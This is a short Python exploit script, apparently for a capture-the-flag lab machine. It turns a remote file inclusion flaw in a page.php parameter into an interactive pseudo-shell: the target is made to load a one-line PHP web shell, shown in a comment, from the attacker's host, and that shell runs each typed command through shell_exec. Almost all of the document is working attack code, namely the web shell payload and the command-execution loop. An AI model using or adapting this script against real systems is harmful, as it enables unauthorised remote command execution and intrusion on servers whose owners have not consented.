#!/usr/bin/env python3
# myshell.php
# <?php echo '<pre>' . shell_exec(urldecode($_GET['cmd'])) . '</pre>';?>
import urllib.parse
import socket
import re
__author__ = "oats"

target_ip = "10.10.10.44"
source_ip = "192.168.178.12"
target_port = 80

way_in = "?page=http://{}/myshell.php&cmd=".format(source_ip)
response_reg = r'<pre>([\s\S]*)\n</pre>' # anyting between pre tags


# handle large responses
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        if not part: # no more data
            break
        data += part
    return data


# pseudo shell loop
while True:
    inp = input("> ")
    if inp == 'exit':
        break
    elif inp == "":
        continue

    #encoded = urllib.parse.quote(inp, safe='')
    encoded = urllib.parse.quote(inp)

    buffer = ""
    buffer += "GET /page.php{0}{1} HTTP/1.0\r\n".format(way_in, encoded)
    buffer += "Connection: close\r\n"
    buffer += "\r\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(buffer.encode())
    received = recvall(s).decode()
    #print(received)

    matchObj = re.search( response_reg, received, re.M|re.I)
    if(matchObj):
        print(matchObj.group(1))
    else:
        print("[failed] received length:", len(received))
    s.close()
print("Exiting...")


